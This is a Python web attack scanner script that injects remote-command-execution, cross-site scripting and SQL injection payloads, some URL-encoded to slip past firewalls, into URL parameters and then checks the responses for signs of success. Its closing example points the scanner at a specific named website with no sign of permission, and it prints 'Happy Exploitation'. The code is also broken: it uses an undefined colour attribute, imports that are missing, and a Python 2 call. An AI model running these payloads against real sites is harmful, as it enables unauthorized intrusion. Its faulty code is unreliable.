import urllib.request
import re
from headers import *
from WebScanner import UserAgent

# Class for colors
class Colors:
    def __init__(self):
        self.green = "\033[92m"
        self.bold = "\033[1m"
        self.blue = "\033[94m"
        self.end = "\033[0m"

ga = Colors()

# Function to perform the main scanning
def main_function(url, payloads, check):
    vuln = 0
    try:
        opener = urllib.urlopen(url)
        if opener.code == 999:
            # Detecting the WebKnight WAF from the StatusCode.
            print(ga.red + " [~] WebKnight WAF Detected!" + ga.end)
            print(ga.red + " [~] Delaying 3 seconds between every request" + ga.end)
            time.sleep(3)

        for params in url.split("?")[1].split("&"):
            for payload in payloads:
                bugs = url.replace(params, params + str(payload).strip())
                request = useragent.open(bugs)
                html = request.readlines()

                for line in html:
                    checker = re.findall(check, line)
                    if len(checker) != 0:
                        print(ga.red + " [*] Payload Found . . ." + ga.end)
                        print(ga.red + " [*] Payload: ", payload + ga.end)
                        print(ga.green + " [!] Code Snippet: " + ga.end + line.strip())
                        print(ga.blue + " [*] POC: " + ga.end + bugs)
                        print(ga.green + " [*] Happy Exploitation :D" + ga.end)
                        vuln += 1

        if vuln == 0:
            print(ga.green + " [!] Target is not vulnerable!" + ga.end)
        else:
            print(ga.blue + " [!] Congratulations, you've found %i bugs :-)" % vuln + ga.end)

    except Exception as e:
        print(ga.red + " [!] An error occurred:", str(e) + ga.end)

# Function to scan for Remote Code Execution
def rce_func(url):
    headers_reader(url)
    print(ga.bold + " [!] Now Scanning for Remote Code/Command Execution " + ga.end)
    print(ga.blue + " [!] Covering Linux & Windows Operating Systems " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)
    # Remote Code Injection Payloads
    payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
    # Below are the Encrypted Payloads to bypass some Security Filters & WAF's
    payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
    # Remote Command Execution Payloads
    payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
    # Used re.I to fix the case-sensitive issues like "payload" and "PAYLOAD".
    check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
    main_function(url, payloads, check)

# Function to scan for XSS (Cross-Site Scripting)
def xss_func(url):
    print(ga.bold + "\n [!] Now Scanning for XSS " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)
    # Payloads for XSS
    payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
    payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
    check = re.compile('zigoo0<svg|x>x', re.I)
    main_function(url, payloads, check)

# Function to scan for Error-Based SQL Injection
def error_based_sqli_func(url):
    print(ga.bold + "\n [!] Now Scanning for Error Based SQL Injection " + ga.end)
    print(ga.blue + " [!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases " + ga.end)
    print(ga.blue + " [!] Please wait ...." + ga.end)
    # SQL Injection Payloads
    payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
    check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+quote|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
    main_function(url, payloads, check)

# Example usage:
url = "https://thoratbags.netlify.app/"
useragent = UserAgent()
rce_func(url)
xss_func(url)

error_based_sqli_func(url)
